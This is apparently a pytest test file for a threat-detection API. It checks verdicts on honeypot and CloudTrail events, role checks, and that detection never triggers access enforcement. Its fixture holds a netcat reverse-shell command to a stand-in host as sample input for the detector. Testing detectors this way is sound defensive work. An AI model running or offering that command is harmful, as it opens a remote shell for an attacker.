from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.security import Principal, Role, get_principal
from app.services.continuous_signals import ContinuousSignalService
from app.services.zero_trust import ZeroTrustOperations


@pytest.fixture
def client():
    previous = app.dependency_overrides.copy()
    app.dependency_overrides[get_principal] = lambda: Principal(
        "test-analyst", "tenant-a", frozenset({Role.ANALYST}), "test",
    )
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.clear()
        app.dependency_overrides.update(previous)


def payload():
    return {
        "source": "cowrie", "original_group_id": "public-capture",
        "events": [{"id": "record-1", "timestamp": datetime.now(UTC).isoformat(),
                    "kind": "cowrie.command.input", "connection_id": "capture-connection",
                    "command": "nc peer.invalid 9999 -e /bin/sh"}],
    }


def forbid_enforcement(monkeypatch):
    def forbidden(*args, **kwargs):
        pytest.fail("reference detection attempted an access-state operation")

    for name in ("revoke", "access", "revalidate_sessions", "evaluate", "evaluate_signed", "apply_observation"):
        monkeypatch.setattr(ZeroTrustOperations, name, forbidden)
    for name in ("accept", "process_one"):
        monkeypatch.setattr(ContinuousSignalService, name, forbidden)


def test_behavior_api_has_no_enforcement_authority(client, monkeypatch):
    forbid_enforcement(monkeypatch)
    response = client.post("/detections/public/evaluate", json=payload())
    assert response.status_code == 200
    body = response.json()
    assert body["verdict"] == "threat"
    assert body["enforcement_eligible"] is False
    assert body["evidence_ids"] == ["record-1"]
    assert body["sigma"]["matches"]


@pytest.mark.parametrize("action", ["PutObject", "DeleteObject", "GetObject"])
def test_bulk_public_activity_is_an_investigation_without_access_changes(client, monkeypatch, action):
    forbid_enforcement(monkeypatch)
    instant = datetime.now(UTC).isoformat()
    data = {"source": "cloudtrail", "original_group_id": "bulk-activity", "events": [
        {"id": f"record-{number}", "timestamp": instant, "kind": "AwsApiCall",
         "api_service": "s3.amazonaws.com", "api_action": action,
         "principal_hash": "actor-a", "connection_id": "credential-a",
         "resource_hashes": [f"object-{number}"], "outcome": "success"}
        for number in range(100)
    ]}
    response = client.post("/detections/public/evaluate", json=data)
    assert response.status_code == 200
    body = response.json()
    assert body["verdict"] == "unknown"
    assert body["investigation_required"] is True
    assert body["evidence_ids"] == []
    assert len(body["candidate_evidence_ids"]) == 100
    assert body["enforcement_eligible"] is False
    assert {finding["disposition"] for finding in body["findings"]} == {"investigate"}
    # A separate routine request is evaluated independently, not contaminated by the burst.
    routine = data | {"original_group_id": "other-session", "events": [
        data["events"][0] | {"id": "routine", "api_action": "GetObject",
                             "principal_hash": "actor-b", "connection_id": "credential-b"},
    ]}
    other = client.post("/detections/public/evaluate", json=routine).json()
    assert other["verdict"] == "normal"
    assert other["investigation_required"] is False


@pytest.mark.parametrize("field,value", [
    ("expected_label", "threat"), ("families", ["malicious"]),
    ("tenant_id", "tenant-b"), ("verified_device_compromise", True),
    ("enforcement_eligible", True),
    ("approval_verified", True), ("baseline_deviation", True),
])
def test_behavior_api_rejects_reference_labels_and_authority_claims(client, field, value):
    data = payload()
    data[field] = value
    assert client.post("/detections/public/evaluate", json=data).status_code == 422


def test_behavior_api_rejects_nested_annotation(client):
    data = payload()
    data["events"][0]["attack_name"] = "publisher-answer"
    assert client.post("/detections/public/evaluate", json=data).status_code == 422


def test_behavior_api_requires_analyst_role(client):
    app.dependency_overrides[get_principal] = lambda: Principal(
        "test-viewer", "tenant-a", frozenset({Role.VIEWER}), "test",
    )
    assert client.post("/detections/public/evaluate", json=payload()).status_code == 403


def test_unknown_behavior_stays_unknown_without_invented_proof_fields(client):
    data = payload()
    data["events"][0]["command"] = "custom-backup --config backup.conf"
    data["events"][0]["connection_id"] = None
    body = client.post("/detections/public/evaluate", json=data).json()
    assert body["verdict"] == "unknown"
    assert "connection_id" in body["missing_fields"]
    assert body["enforcement_eligible"] is False
